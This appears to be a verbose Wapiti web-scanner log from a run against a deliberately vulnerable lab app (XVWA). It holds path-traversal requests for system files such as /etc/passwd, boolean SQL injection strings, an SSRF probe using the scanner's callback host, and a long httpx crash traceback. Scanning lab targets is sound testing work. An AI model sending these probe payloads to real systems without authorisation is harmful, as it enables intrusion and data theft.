+2024-03-20 15:28:36.352 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%2Fetc%2Fpasswd%00 (0)
+2024-03-20 15:28:36.358 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%2Fetc%2Fservices (0)
+2024-03-20 15:28:36.364 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%2Fetc%2Fservices%00 (0)
+2024-03-20 15:28:36.370 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+2024-03-20 15:28:36.375 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
+Traceback (most recent call last):
+
+  File "/usr/local/bin/wapiti", line 8, in <module>
+    sys.exit(wapiti_asyncio_wrapper())
+    │   │    └ <function wapiti_asyncio_wrapper at 0x70619eed8900>
+    │   └ <built-in function exit>
+    └ <module 'sys' (built-in)>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
+    asyncio.run(wapiti_main())
+    │       │   └ <function wapiti_main at 0x70619eed8860>
+    │       └ <function run at 0x7061a3a67560>
+    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           │      │   └ <coroutine object wapiti_main at 0x70619ef87240>
+           │      └ <function Runner.run at 0x7061a38f6fc0>
+           └ <asyncio.runners.Runner object at 0x7061a391f190>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
+           │    │     └ <function BaseEventLoop.run_until_complete at 0x7061a38f4c20>
+           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+           └ <asyncio.runners.Runner object at 0x7061a391f190>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
+    self.run_forever()
+    │    └ <function BaseEventLoop.run_forever at 0x7061a38f4b80>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
+    self._run_once()
+    │    └ <function BaseEventLoop._run_once at 0x7061a38f6980>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
+    handle._run()
+    │      └ <function Handle._run at 0x7061a3a54e00>
+    └ <Handle <TaskStepMethWrapper object at 0x70619e02fcd0>()>
+  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
+    self._context.run(self._callback, *self._args)
+    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
+    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x70619e02fcd0>()>
+    │    │            │    └ <member '_callback' of 'Handle' objects>
+    │    │            └ <Handle <TaskStepMethWrapper object at 0x70619e02fcd0>()>
+    │    └ <member '_context' of 'Handle' objects>
+    └ <Handle <TaskStepMethWrapper object at 0x70619e02fcd0>()>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
+    await wap.attack(global_stop_event)
+          │   │      └ <asyncio.locks.Event object at 0x70619ef34390 [unset]>
+          │   └ <function Wapiti.attack at 0x70619eee2520>
+          └ <wapitiCore.controller.wapiti.Wapiti object at 0x70619f042210>
+> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
+    await attack_module.attack(original_request, original_response)
+          │             │      │                 └ <wapitiCore.net.response.Response object at 0x70619e0c9090>
+          │             │      └ GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+          │             └ <function ModuleFile.attack at 0x70619e10b1a0>
+          └ <wapitiCore.attack.mod_file.ModuleFile object at 0x70619e2ebe50>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_file.py", line 166, in attack
+    response = await self.crawler.async_send(mutated_request)
+                     │    │       │          └ GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+                     │    │       └ <function AsyncCrawler.async_send at 0x7061a2742020>
+                     │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x70619ec9ea10>
+                     └ <wapitiCore.attack.mod_file.ModuleFile object at 0x70619e2ebe50>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
+    response = await self.async_get(request, headers=headers,
+                     │    │         │                └ None
+                     │    │         └ GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+                     │    └ <function AsyncCrawler.async_get at 0x7061a2742160>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x70619ec9ea10>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
+    value = await function(*args, **kwargs)
+                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
+                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x70619ec9ea10>, GET http://web/xvwa/vulnerabilities/redirect/redirect.php?fo...
+                  └ <function AsyncCrawler.async_get at 0x7061a27420c0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
+    response = await self._client.send(
+                     │    │       └ <function AsyncClient.send at 0x7061a2cb91c0>
+                     │    └ <httpx.AsyncClient object at 0x70619ef0e550>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x70619ec9ea10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
+    response = await self._send_handling_auth(
+                     │    └ <function AsyncClient._send_handling_auth at 0x7061a2cb9260>
+                     └ <httpx.AsyncClient object at 0x70619ef0e550>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
+    response = await self._send_handling_redirects(
+                     │    └ <function AsyncClient._send_handling_redirects at 0x7061a2cb9300>
+                     └ <httpx.AsyncClient object at 0x70619ef0e550>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
+    raise exc
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
+    request = self._build_redirect_request(request, response)
+              │    │                       │        └ <Response [302 Found]>
+              │    │                       └ <Request('GET', 'http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cse...
+              │    └ <function BaseClient._build_redirect_request at 0x7061a2cabc40>
+              └ <httpx.AsyncClient object at 0x70619ef0e550>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
+    url = self._redirect_url(request, response)
+          │    │             │        └ <Response [302 Found]>
+          │    │             └ <Request('GET', 'http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cse...
+          │    └ <function BaseClient._redirect_url at 0x7061a2cabd80>
+          └ <httpx.AsyncClient object at 0x70619ef0e550>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
+    url = url.copy_with(host=request.url.host)
+          │   │              │       │   └ <property object at 0x7061a33be110>
+          │   │              │       └ URL('http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+          │   │              └ <Request('GET', 'http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cse...
+          │   └ <function URL.copy_with at 0x7061a33c98a0>
+          └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
+    return URL(self, **kwargs)
+           │   │       └ {'host': 'web'}
+           │   └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+           └ <class 'httpx.URL'>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
+    self._uri_reference = url._uri_reference.copy_with(**kwargs)
+    │                     │   │              │           └ {'host': 'web'}
+    │                     │   │              └ <function ParseResult.copy_with at 0x7061a33c8400>
+    │                     │   └ ParseResult(scheme='c', userinfo='', host='', port=None, path='%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices', query=None,...
+    │                     └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+    └ <unprintable URL object>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
+    return urlparse("", **defaults)
+           │              └ {'scheme': 'c', 'authority': '', 'path': '%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices', 'query': None, 'fragment': None,...
+           └ <function urlparse at 0x7061a33c8220>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
+    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
+    │             │                │                         └ True
+    │             │                └ True
+    │             └ '%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices'
+    └ <function validate_path at 0x7061a33c8a40>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
+    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
+          └ <class 'httpx.InvalidURL'>
+
+httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
+2024-03-20 15:28:36.435 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
+2024-03-20 15:28:36.532 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report 8503e96a-e6ce-11ee-94ea-0242ac160004 ... SUCCESS
+2024-03-20 15:28:36.539 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 15:28:36.554 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:36.555 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%C2%BF%27%22%28 (0)
+2024-03-20 15:28:36.573 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%20AND%2043%3D75%20AND%2069%3D69 (0)
+2024-03-20 15:28:36.581 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%20AND%2035%3D77%20AND%2031%3D31 (0)
+2024-03-20 15:28:36.589 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%20AND%2079%3D79%20AND%2091%3D91 (0)
+2024-03-20 15:28:36.598 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%27%20AND%2087%3D184%20AND%20%2757%27%3D%2757 (0)
+2024-03-20 15:28:36.606 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%27%20AND%2066%3D90%20AND%20%2721%27%3D%2721 (0)
+2024-03-20 15:28:36.614 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%27%20AND%2090%3D90%20AND%20%2744%27%3D%2744 (0)
+2024-03-20 15:28:36.622 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%22%20AND%2072%3D112%20AND%20%2269%22%3D%2269 (0)
+2024-03-20 15:28:36.630 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%22%20AND%2050%3D108%20AND%20%2287%22%3D%2287 (0)
+2024-03-20 15:28:36.638 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%22%20AND%2045%3D45%20AND%20%2221%22%3D%2221 (0)
+2024-03-20 15:28:36.646 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%29%20AND%2028%3D110%20AND%20%2819%3D19 (0)
+2024-03-20 15:28:36.654 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%29%20AND%2016%3D109%20AND%20%2891%3D91 (0)
+2024-03-20 15:28:36.662 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%29%20AND%2064%3D64%20AND%20%2867%3D67 (0)
+2024-03-20 15:28:36.670 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%27%29%20AND%2071%3D169%20AND%20%28%2792%27%3D%2792 (0)
+2024-03-20 15:28:36.678 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%27%29%20AND%2083%3D141%20AND%20%28%2782%27%3D%2782 (0)
+2024-03-20 15:28:36.687 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%27%29%20AND%2050%3D50%20AND%20%28%2785%27%3D%2785 (0)
+2024-03-20 15:28:36.695 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%22%29%20AND%2045%3D84%20AND%20%28%2231%22%3D%2231 (0)
+2024-03-20 15:28:36.703 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%22%29%20AND%2011%3D78%20AND%20%28%2254%22%3D%2254 (0)
+2024-03-20 15:28:36.708 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%22%29%20AND%2067%3D67%20AND%20%28%2257%22%3D%2257 (0)
+2024-03-20 15:28:36.729 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 15:28:36.740 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:36.740 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Ftjv5ix%2F1%2F666f7277617264%2F (0)
+2024-03-20 15:28:36.761 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=tjv5ix for results, please wait...
+2024-03-20 15:28:39.130 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 15:28:39.172 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 15:28:39.193 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:39.216 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 15:28:39.238 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:39.254 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 15:28:39.262 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:39.268 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 15:28:39.341 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 15:28:39.355 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:39.360 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 15:28:39.360 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 15:28:39.417 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 15:28:39.417 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 15:28:39.492 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 15:28:39.597 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 15:28:39.619 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//redirect.json/
+2024-03-20 15:28:39.619 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//redirect.json/web_03202024_1528.html with a browser to see this report.
